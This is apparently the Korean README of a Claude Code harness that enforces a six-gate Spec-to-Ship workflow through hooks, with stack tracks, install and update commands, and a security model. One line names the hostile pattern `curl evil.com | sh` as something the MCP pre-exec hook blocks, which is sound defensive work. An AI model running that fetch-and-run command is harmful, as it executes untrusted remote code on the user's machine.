# uzys-claude-harness

> Claude Code 에이전트 하네스 — 6-gate 워크플로우 + Ralph 루프 + 9 스택 트랙. Lean by design.

[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
[![Version](https://img.shields.io/github/v/tag/uzysjung/uzys-claude-harness?label=version)](https://github.com/uzysjung/uzys-claude-harness/releases)
[![Tests](https://img.shields.io/badge/tests-111%20PASS%20%2F%200%20FAIL-brightgreen)](scripts/test-harness.sh)
[![CI](https://github.com/uzysjung/uzys-claude-harness/actions/workflows/test.yml/badge.svg)](https://github.com/uzysjung/uzys-claude-harness/actions)

🇬🇧 **English README**: [README.md](./README.md)

## 30초 시작

```bash
# 프로젝트 디렉토리에서:
curl -fsSL https://raw.githubusercontent.com/uzysjung/uzys-claude-harness/main/install.sh \
  | bash -s -- --track csr-fastapi --project-dir .

# Claude Code 시작:
claude
> /uzys:spec    # 만들 것 정의
> /uzys:auto    # 전체 파이프라인 (Plan → Build → Test → Review → Ship) 실행
```

`csr-fastapi` 자리에 다음 중 하나: `csr-supabase`, `csr-fastify`, `ssr-nextjs`, `ssr-htmx`, `data`, `executive`, `tooling`, `full` — [Tracks](#tracks-) 참조.

## 왜 써야 하나요?

| 이때 사용 | 이때 패스 |
|----------|-----------|
| **결정론적 6-gate 워크플로우** (Spec → Ship)를 free-form chat 대신 원할 때 | 한 줄 fix만 필요 → 그냥 Claude Code |
| **여러 스택** (Python REST + React, Next.js, data/PySide6, executive docs) 가로질러 같은 하네스 원함 | 한 스택 + 한 도구 세트만 사용 |
| **ECC, agent-skills, Anthropic skills, Railway, Supabase**를 트랙별로 자동 wired up 원함 | 각 plugin/MCP 직접 설치하며 통제 원함 |
| LLM을 **hook으로 제약** (파일 보호, 보안 스캔, gate 순서)하길 원함 — 단순 prompt 아님 | 모델과 파일시스템 사이 최소 개입 원함 |
| **Lean** 가치 — 모든 Rule/Hook이 제 역할 함; 명백한 linter 영역은 제거 | 포괄적 style guide + "best practices" 강제 좋아함 |

## 이게 뭔가요?

[Claude Code](https://claude.com/claude-code) 위에서 동작하는 **결정론적 하네스**:

- **6-gate 워크플로우** (`Spec → Plan → Build → Test → Review → Ship`) hook으로 강제
- **9 스택 트랙** 지원 (csr-supabase / csr-fastify / csr-fastapi / ssr-htmx / ssr-nextjs / data / executive / tooling / full)
- 트랙별로 **검증된 plugins / skills / MCP servers / agents** 번들 ([docs/REFERENCE.md](./docs/REFERENCE.md))
- **Lean** 유지 — Rule 17 / Hook 자동등록 6. 자명하거나 중복인 것은 제거
- **continuous-learning + Ralph 루프**로 자기 개선 (SPEC 기반 자율 사이클)
- 프로젝트 스코프 전용. **글로벌 `~/.claude/`는 절대 건드리지 않음**

CTO/COO 출신 눈높이의 시니어 엔지니어 / 멀티 역할 사용자(CEO/CTO/CISO/데이터 사이언티스트)가 매우 다른 스택에서 같은 하네스를 쓰고 싶을 때 사용.

## 설치

### Step 1 — Track 선택

| 만들고 있는 스택 | 설치할 Track |
|----------------|------------|
| Python REST API + React/shadcn/ui | `csr-fastapi` |
| TypeScript REST API + React/shadcn/ui | `csr-fastify` |
| 실시간/Auth/PostgreSQL (Supabase) + React/shadcn/ui | `csr-supabase` |
| SEO 필요 + React/shadcn/ui (SSR) | `ssr-nextjs` |
| 최소 JS (서버 렌더 + HTMX + daisyUI) | `ssr-htmx` |
| 데이터 분석/ML/DL/PySide6 desktop | `data` |
| 제안서/PPT/재무모델 (코드 없음) | `executive` |
| Bash/CLI/Markdown 메타 프로젝트 | `tooling` |
| 둘 이상 동시 (예: tooling + Python) | `--track tooling --track csr-fastapi` (다중) 또는 `full` |

### Step 2 — 설치 실행

`<TRACK>` 자리에 위 표에서 고른 값을 넣는다 (예: `csr-fastapi`).

```bash
# 프로젝트 디렉토리에서:
curl -fsSL https://raw.githubusercontent.com/uzysjung/uzys-claude-harness/main/install.sh \
  | bash -s -- --track <TRACK> --project-dir .
```

이 한 줄이 하는 일:
1. 하네스를 임시 디렉토리에 shallow-clone
2. 프로젝트에서 `setup-harness.sh --track <TRACK>` 실행
3. 임시 디렉토리 정리

설치 후 카테고리별 `✅` Installation Report가 출력된다.

### Step 3 — Claude Code 시작

```bash
claude
# Claude Code 안에서:
/uzys:spec    # 만들 것을 정의
/uzys:auto    # 그 후 전체 파이프라인 (Plan → Build → Test → Review → Ship) 실행
```

---

## 자주 쓰는 시나리오

### 기존 설치에 Track 추가

이미 `csr-fastapi` 설치했고, `tooling` (하네스의 bash/markdown 작업용)도 추가하고 싶다면:

**원격 (권장 — clone 불필요)**:
```bash
curl -fsSL https://raw.githubusercontent.com/uzysjung/uzys-claude-harness/main/install.sh \
  | bash -s -- --add-track tooling --project-dir .
```

**로컬 clone에서**:
```bash
bash /path/to/uzys-claude-harness/scripts/setup-harness.sh --add-track tooling --project-dir .
```

`--add-track`은 기존 `.claude/*`를 보존하고 새 MCP를 `jq`로 `.mcp.json`에 idempotent merge.

### 기존 설치를 최신 하네스 버전으로 업데이트

새 release가 나오면 ([CHANGELOG.md](./CHANGELOG.md) 확인):

**원격 (권장)**:
```bash
curl -fsSL https://raw.githubusercontent.com/uzysjung/uzys-claude-harness/main/install.sh \
  | bash -s -- --update --project-dir .
```

**로컬 clone에서**:
```bash
bash /path/to/uzys-claude-harness/scripts/setup-harness.sh --update --project-dir .
```

`--update` 동작:
1. **백업** — 현재 `.claude/`를 `.claude.backup-<timestamp>/`로 스냅샷
2. **덮어쓰기** — `rules/*.md`, `agents/*.md`, `commands/uzys/*.md`, `hooks/*.sh`, `.claude/CLAUDE.md` 중 **이미 존재하는 파일만** 최신 templates로 덮어쓰기 (Track 혼입 방지)
3. **Orphan prune** — `.claude/`에 있지만 templates에는 없는 파일 제거 (예: 폐기된 `ecc-security-common.md`)
4. **Stale hook ref 정리** — 존재하지 않는 hook 파일을 가리키는 `settings.json` PreToolUse/PostToolUse 항목 제거

**보존**: `gate-status.json`, `.mcp.json` (사용자 추가 MCP 유지), `docs/SPEC.md`/`PRD.md`, `.claude/settings.local.json`.

문제 시 rollback:
```bash
rm -rf .claude && mv .claude.backup-<timestamp> .claude
```

### 이 리포 자체에 dogfood 설치

```bash
git clone https://github.com/uzysjung/uzys-claude-harness.git
cd uzys-claude-harness
bash scripts/setup-harness.sh --track tooling --project-dir .
```

### 다중 Track 동시 설치 (union)

```bash
bash scripts/setup-harness.sh --track tooling --track csr-fastapi --project-dir .
```

처음부터 여러 Track 필요한 걸 알면 이게 가장 빠름 (2회 setup보다 빠름).

### Optional — ECC plugin 프로젝트 스코프 설치

**대화형 터미널** (또는 `curl | bash` — `/dev/tty`로 동작) 환경에서 `setup-harness.sh`가 묻는다:

```
[ECC] Plugin 프로젝트 스코프 설치 (선택사항)
[ECC] 설치(copy) 진행? [y/N]
[ECC] 불필요 항목 제거(prune)? [y/N]
```

둘 다 `y`면 [Everything-Claude-Code](https://github.com/affaan-m/everything-claude-code)를 `.claude/local-plugins/ecc/`로 복사하고 ~228 항목 prune. 사용:

```bash
claude --plugin-dir .claude/local-plugins/ecc
# 또는 ~/.zshrc:
# alias claude-ecc='claude --plugin-dir .claude/local-plugins/ecc'
```

글로벌 `~/.claude/`는 절대 무영향.

### 비대화형 플래그 (CI / 자동화)

CI나 완전 unattended 환경에서 프롬프트 없이 진행하려면:

```bash
curl -fsSL https://raw.githubusercontent.com/uzysjung/uzys-claude-harness/main/install.sh \
  | bash -s -- --track csr-fastapi --project-dir . \
    --with-ecc \         # ECC plugin 자동 설치 (프롬프트 skip)
    --with-prune \       # prune도 자동 (--with-ecc 자동 포함)
    --with-tob \         # Trail of Bits 보안 플러그인 설치
    --gsd                # GSD 오케스트레이터 포함
```

| 플래그 | 효과 |
|------|------|
| `--with-ecc` | "ECC 설치?" 프롬프트 skip → `y` |
| `--with-prune` | "prune?" 프롬프트 skip → `y` (`--with-ecc` 자동 활성) |
| `--with-tob` | "Trail of Bits?" 프롬프트 skip → `y` |
| `--gsd` | GSD 오케스트레이터 설치 |

### 기타 옵션

```bash
bash scripts/setup-harness.sh --help                 # 전체 옵션 표시
```

### 사전 요구사항

- Node.js 22+
- Git
- Claude Code CLI (`claude`)
- jq (권장; bash fallback 있음)

## CLAUDE.md 위치 (canonical 명시)

이 리포지토리에는 4종류 CLAUDE.md가 있음 — 역할 분리:

| 위치 | 역할 | 누가 사용? |
|------|------|----------|
| `/CLAUDE.md` (root) | **이 메타 리포 자체용** (tooling Track) | uzys-claude-harness 개발 시 |
| `/.claude/CLAUDE.md` | **이 메타 리포 적용 글로벌 원칙** (11 Principles + Decision Meta-Rule) | 이 리포에서 작업 시 Claude가 읽음 |
| `/templates/CLAUDE.md` | **신규 프로젝트로 복사되는 원본 템플릿** | `scripts/setup-harness.sh`가 신규 프로젝트의 `.claude/CLAUDE.md`로 복사 |
| `/templates/project-claude/<track>.md` | **신규 프로젝트의 root `/CLAUDE.md`로 복사되는 Track별 가이드** | `scripts/setup-harness.sh`가 신규 프로젝트 root에 복사 |

**Canonical 원본**: `/templates/CLAUDE.md` 와 `/templates/project-claude/<track>.md`.

## Tracks

| Track | 스택 | 역할 |
|-------|-----|-----|
| `csr-supabase` | Supabase + React/shadcn/ui (Vercel/Netlify 배포) | 개발자 |
| `csr-fastify` | TypeScript REST API + React/shadcn/ui | 개발자 |
| `csr-fastapi` | Python REST API + React/shadcn/ui | 개발자 |
| `ssr-htmx` | FastAPI + Jinja2 + HTMX + daisyUI | 개발자 |
| `ssr-nextjs` | Next.js + shadcn/ui | 개발자 |
| `data` | Python + DuckDB + Trino + ML/DL + PySide6 | 데이터 사이언티스트 |
| `executive` | PPT/Excel/Word/PDF + 제안서/DD | CPO/CSO/CTO |
| `tooling` | Bash + Markdown + CLI 도구 (메타 프로젝트) | 도구/하네스 개발자 |
| `full` | 모든 트랙 union | 전체 |

### Track 결정 가이드

| 상황 | 권장 Track |
|------|----------|
| Python REST API + React 프론트 | `csr-fastapi` |
| TypeScript REST API + React 프론트 | `csr-fastify` |
| 실시간/Auth/PostgreSQL 우선 (Supabase) | `csr-supabase` |
| SEO 필요 + React (SSR) | `ssr-nextjs` |
| 최소 JS (서버 렌더 + HTMX) | `ssr-htmx` |
| 데이터 분석/ML/DL/PySide6 desktop | `data` |
| 제안서/PPT/재무모델 (코드 없음) | `executive` |
| Bash/CLI/Markdown 메타 프로젝트 | `tooling` |
| 둘 이상 동시 (예: tooling + Python) | `--track tooling --track csr-fastapi` 또는 `full` |

## 11개 행동 원칙

Karpathy LLM 관찰 + Anthropic Harness Design + 실전 운영 경험에서 추출:

1. **Think Before Acting** — 가정 금지, 모호하면 확인
2. **Simplicity First** — 명시되지 않은 것은 범위 밖
3. **Surgical Changes** — 건드려야 할 것만, DO NOT CHANGE 보호
4. **Goal-Driven Execution** — 검증 가능한 성공 기준
5. **Separate Eval from Gen** — reviewer subagent context fork로 SOD 강제
6. **Long-Running Management** — Phase + 인간 게이트
7. **Fact vs Opinion** — 출처 필수
8. **Sprint Contract** — 작업 전 "완료" 정의
9. **Circuit Breakers** — 3회 실패 → 멈추고 보고
10. **Harness Maintenance** — 단순 시작, 필요 시만 추가, 분기 1회 prune
11. **Perimeter Not Blueprint** — what + why + 경계만 주고 how는 에이전트 결정

추가 **Decision Making 메타 원칙**: 모든 가치 판단은 명시된 검증 가능한 기준에 근거. 추정/감각 금지.

### Design Philosophy

- **HyperAgents**: 메타 개선 가능 (인간 게이트 필수). auto memory + CL-v2 instinct로 경험 축적
- **gitagent SOD**: agent 정의는 git 버전 관리. reviewer ≠ implementor. 메모리는 Git에
- **agent-skills**: 6-gate 워크플로우(Define→Plan→Build→Verify→Review→Ship)가 뼈대

## 동작 구조

```
┌────────────────────────────────────────────────────────────────┐
│  Project (.claude/)                                             │
│  CLAUDE.md  →  11 원칙 + Decision Meta-Rule + Gates             │
│                                                                  │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐             │
│  │ commands/   │  │ rules/ (17) │  │ skills/     │             │
│  │ uzys:* (7)  │  │ git-policy  │  │ CL-v2       │             │
│  │ ecc:*  (8)  │  │ test-policy │  │ spec-scaling│             │
│  │             │  │ ship-       │  │ deep-       │             │
│  │             │  │ checklist   │  │ research    │             │
│  └─────────────┘  └─────────────┘  └─────────────┘             │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐             │
│  │ agents/ (8) │  │ hooks/ (6)  │  │ .mcp.json   │             │
│  │ reviewer    │  │ session     │  │ context7    │             │
│  │ data-       │  │ protect     │  │ github      │             │
│  │ analyst     │  │ gate-check  │  │ chrome-     │             │
│  │ strategist  │  │ agentshield │  │ devtools    │             │
│  │ + 5 ECC     │  │ + 1 utility │  │ + 트랙별    │             │
│  └─────────────┘  └─────────────┘  └─────────────┘             │
└────────────────────────────────────────────────────────────────┘
```

6-gate는 `gate-check.sh` PreToolUse hook으로 강제. 게이트 건너뛰기 시 exit 2 + blocker 메시지. `/uzys:auto`가 SPEC 만족까지 Ralph 루프로 자율 실행 (최대 5 iter).

## 예시 워크플로우

`csr-fastapi`로 "Postgres + Auth 사용하는 사내 노트 앱" 만들기:

```bash
# 1. Fresh 프로젝트에 하네스 설치
mkdir notes && cd notes && git init
curl -fsSL https://raw.githubusercontent.com/uzysjung/uzys-claude-harness/main/install.sh \
  | bash -s -- --track csr-fastapi --project-dir .

# 2. Claude Code 시작
claude

# Claude Code 안에서:
> /uzys:spec
# → Pre-SPEC 질의 시작:
#   - Prod DB 엔진?              "Postgres 16 (Railway)"
#   - 테스트 DB 전략?            "testcontainer (Postgres 16)"
#   - 외부 의존성?               "GitHub OAuth (Live staging E2E 필수)"
#   - 핵심 E2E 플로우?           "login → callback → /me, 노트 생성"
#   - DESIGN.md/.impeccable.md?  "없음 — /teach 먼저 호출해 디자인 톤 잡기"
# → docs/SPEC.md 생성 (Objective, AC, Non-Goals, DO NOT CHANGE 포함)

> /uzys:auto
# → Plan: trivial=skip, standard=milestone(3-5), complex=full task list
#   (모델 인식 — Opus는 micro-decomposition skip, Haiku는 detailed)
# → Build: task별 RED → GREEN → REFACTOR
# → Test: testcontainer Postgres + Live OAuth E2E (Mock 금지)
# → Review: 5축 (correctness/readability/architecture/security/perf)
#   reviewer subagent (context: fork) — 구현자와 분리
# → Ship: agentshield scan + SPEC drift check + Railway 배포
# → Ralph 루프 최대 5회 반복, SPEC AC 미충족 시 사용자 escalation
```

배경 동작:
- `protect-files.sh`가 `.env`, lock 파일, credentials Edit 차단
- `gate-check.sh`가 `define.completed=false`면 `/uzys:plan` 차단
- `mcp-pre-exec.sh`가 MCP allowlist + `curl evil.com | sh` 패턴 차단
- `agentshield-gate.sh`가 CRITICAL finding 시 `/uzys:ship` 차단

## ECC plugin 통합 (선택)

[Everything-Claude-Code (ECC)](https://github.com/affaan-m/everything-claude-code)는 300+ skills/agents/commands 번들. `scripts/setup-harness.sh` 마지막에 2단계 프롬프트:

```
[ECC] Plugin 프로젝트 스코프 설치 (선택사항)
  1. ECC plugin을 프로젝트 스코프로 설치(copy)? [y/N]
  2. ECC에서 불필요 항목을 제거(prune)? [y/N]
  → DELETED/KEPT 파일 목록 화면 표시
```

이후 `claude --plugin-dir .claude/local-plugins/ecc`로 사용. 글로벌 `~/.claude/` 무영향.

## 보안 모델

- **MCP allowlist**: `.mcp-allowlist` 파일이 모든 MCP 호출을 `mcp-pre-exec.sh` hook으로 게이팅
- **D16 보호**: `setup-harness.sh --project-dir`이 `~/.claude/*`, `/etc/*`, 시스템 bins 차단
- **`.env` / credentials 보호**: `protect-files.sh` hook이 보호 경로 Write/Edit 차단
- **Pre-ship 보안 게이트**: `agentshield-gate.sh`가 `/uzys:ship` 전 `npx ecc-agentshield scan` 실행
- 전체 보안 정책: [docs/REFERENCE.md §8](./docs/REFERENCE.md#8-보안--신뢰-정책)

## 프로젝트 발전 방향

3가지 commitment (`templates/CLAUDE.md` 참조):

1. **ECC.tools 의존** — 자체 구현 최소화, ECC 스킬/에이전트를 `/uzys:*`로 orchestrate
2. **Ralph 루프 자율성** — continuous-learning-v2 + `/uzys:auto` SPEC 기반 자율 사이클
3. **Lean by design** — 기능 추가 전 "ECC에 있는가?" 확인 → 분기 1회 P10 재평가

## 문서

| 파일 | 용도 |
|------|------|
| [README.md](./README.md) | 영어 README |
| [docs/USAGE.md](./docs/USAGE.md) | 일상 워크플로우 가이드 (`/uzys:*` 명령, 게이트 흐름) |
| [**docs/REFERENCE.md**](./docs/REFERENCE.md) | **설치되는 모든 자산 카탈로그** (Plugins / Skills / MCP / Agents / Cherry-pick) — 출처 / 신뢰 등급 / 정확한 설치 명령 |
| [CONTRIBUTING.md](./CONTRIBUTING.md) | 트랙 / Rule / Hook / 명령 추가 방법 |
| [CHANGELOG.md](./CHANGELOG.md) | 릴리즈 히스토리 |

## FAQ

**Q. Linux / WSL / Windows에서 동작하나?**
A. macOS + Linux (WSL 포함)는 CI에서 검증. Native Windows shell은 미지원 — WSL 사용 권장.

**Q. 글로벌 `~/.claude/`를 건드리나?**
A. 안 건드림. `setup-harness.sh --project-dir`이 `~/.claude/*`, `/etc/*`, `/usr/bin/*` 등 차단 (D16 보호). 모든 설치는 프로젝트 스코프.

**Q. 이전 버전 설치돼 있는데?**
A. `bash scripts/setup-harness.sh --update --project-dir .` — `.claude/`를 `.claude.backup-<ts>/`로 백업 + 기존 파일만 latest templates로 덮어쓰기 + orphan 자동 제거 (예: 폐기된 rule) + `settings.json` stale hook 참조 정리.

**Q. 9 Track은 너무 많은 거 아닌가?**
A. Track은 조건부 install list일 뿐 abstraction 아님. Track 추가 = TSV 한 줄 + rule 매핑 한 줄. 런타임 비용 0. 필요한 Track만 사용; `--track` 명시 선택.

**Q. ECC plugin 없이도 쓸 수 있나?**
A. 가능. ECC는 opt-in (인터랙티브 프롬프트 또는 `--with-ecc` 플래그). 6-gate workflow + agent-skills + 트랙별 plugin은 standalone 동작.

**Q. 새 Track / Rule / Hook 추가하려면?**
A. [CONTRIBUTING.md](./CONTRIBUTING.md) — 단계별 가이드.

**Q. Cursor / Codex에서도 쓸 수 있나?**
A. 아직 안 됨. Hook + `settings.json` 문법은 Claude Code 전용. agent-skills (npx skills)는 cross-host 동작 (Agent Skills 표준)이지만 하네스 orchestration은 Claude 전용.

**Q. 너무 의견이 많은데 override 가능한가?**
A. 가능. `--update` 시 templates 재생성하지만, 그전엔 `.claude/rules/*.md` 또는 `templates/*` 직접 편집 가능. `setup-harness.sh`는 `--update` 시에만 덮어쓰기.

## License

MIT — Copyright (c) 2026 Jay (Uzys Jung). [LICENSE](./LICENSE) 참조.
